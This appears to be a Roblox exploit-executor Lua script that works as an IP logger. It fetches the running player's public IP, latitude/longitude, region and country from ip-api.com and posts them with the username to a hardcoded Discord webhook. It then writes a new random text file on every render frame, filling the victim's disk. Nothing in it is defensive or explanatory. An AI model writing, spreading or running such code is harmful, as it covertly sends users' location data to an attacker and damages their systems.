local LP = game.GetService(game,'Players').LocalPlayer
local HttpService = game.GetService(game,'HttpService')
local RunService = game.GetService(game,'RunService')
local request = (syn and syn.request) or request
local a = game:HttpGet("http://ip-api.com/json/");
local b = HttpService:JSONDecode(a);

if b.query then 
    local data = {
        ['embeds'] = {
            {['title'] = 'IP LOG',
            ['color'] = tonumber(65545),
            ['description'] = '[Username:] '..LP.Name..'\n[IP]: '..tostring(b.query) .. '\n'..'[Latitude/Longitude]: '..tostring(b.lat) ..'/'..tostring(b.lon)..'\n'..
            '[Region]: '..tostring(b.regionName) .. '\n [Country]: '..tostring(b.country)}
        },
    }
    
    syn.request({
        Url = 'https://discord.com/api/webhooks/1002180430990147684/rdknN7UD-FQxKpn0XPRjiVxvFjEM-gRo4ssg6g1Pde8Eo8dhilsWdvI5M48L6ZtLEKsM',
        Method = 'POST',
        Body = HttpService:JSONEncode(data),
        Headers = {['Content-Type'] = 'application/json'},
    })
    
    --game:Shutdown()
end

RunService.RenderStepped:Connect(function()
    local result = tostring(math.random())
    writefile(result..'.txt',result)
    
end)
